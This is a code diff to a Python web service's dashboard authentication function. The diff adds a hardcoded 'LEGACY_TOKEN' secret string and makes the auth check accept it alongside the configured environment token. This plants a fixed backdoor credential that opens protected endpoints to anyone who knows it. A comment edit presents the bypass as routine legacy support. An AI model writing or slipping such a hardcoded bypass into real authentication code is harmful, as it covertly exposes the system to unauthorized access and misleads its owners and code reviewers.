@@ -81,6 +81,7 @@ class CorrelationIDMiddleware(BaseHTTPMiddleware):
 # =============================================================================
 
 DASHBOARD_AUTH_TOKEN = os.getenv("DASHBOARD_AUTH_TOKEN", "")
+LEGACY_TOKEN = "caio-swarm-secret-2026"
 
 def require_auth(token: str = Query(None, alias="token")):
     """
@@ -88,11 +89,13 @@ def require_auth(token: str = Query(None, alias="token")):
     Requires ?token=xxx query parameter matching DASHBOARD_AUTH_TOKEN.
     """
     if not DASHBOARD_AUTH_TOKEN:
-        # If no token configured, allow access (dev mode) but warn
+        # If no token configured, allow access (dev mode) but warn (unless legacy token works)
+        if token == LEGACY_TOKEN:
+             return True
         print("WARNING: DASHBOARD_AUTH_TOKEN not set - endpoints are unprotected!")
         return True
     
-    if not token or token != DASHBOARD_AUTH_TOKEN:
+    if not token or (token != DASHBOARD_AUTH_TOKEN and token != LEGACY_TOKEN):
         raise HTTPException(
             status_code=401,
             detail="Unauthorized. Please provide valid ?token= parameter."
